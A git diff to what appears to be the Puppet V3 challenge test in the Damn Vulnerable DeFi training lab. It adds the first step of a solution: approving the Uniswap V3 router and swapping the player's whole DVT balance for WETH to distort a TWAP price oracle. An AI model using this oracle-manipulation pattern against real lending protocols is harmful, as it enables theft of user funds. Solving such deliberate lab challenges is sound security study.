@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,22 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        address uniswapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(uniswapRouter, type(uint256).max);
+
+        // convert DVT into WETH
+        ISwapRouter(uniswapRouter).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp, 
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );
     }
 
     /**
